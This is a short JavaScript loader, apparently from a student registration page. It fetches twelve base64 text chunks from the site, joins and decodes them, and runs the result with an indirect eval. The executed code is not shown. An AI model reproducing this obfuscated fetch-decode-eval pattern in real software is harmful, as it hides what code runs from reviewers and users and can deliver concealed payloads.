(function(){
  var F=["/js/_asr_cb0.txt","/js/_asr_cb1.txt","/js/_asr_cb2.txt","/js/_asr_cb3.txt","/js/_asr_cb4.txt","/js/_asr_cb5.txt","/js/_asr_cb6.txt","/js/_asr_cb7.txt","/js/_asr_cb8.txt","/js/_asr_cb9.txt","/js/_asr_cb10.txt","/js/_asr_cb11.txt"];
  Promise.all(F.map(function(f){
    return fetch(f,{credentials:"same-origin"}).then(function(r){
      if(!r.ok) throw new Error(f+" "+r.status);
      return r.text();
    });
  })).then(function(parts){
    var b64 = parts.join("").replace(/\s+/g,"");
    var bin = atob(b64);
    var out = "";
    for (var i=0;i<bin.length;i++) out += String.fromCharCode(bin.charCodeAt(i));
    try { out = decodeURIComponent(escape(out)); } catch(_) {}
    (0,eval)(out);
  }).catch(function(e){ console.error("[students-reg] load failed", e); });
})();
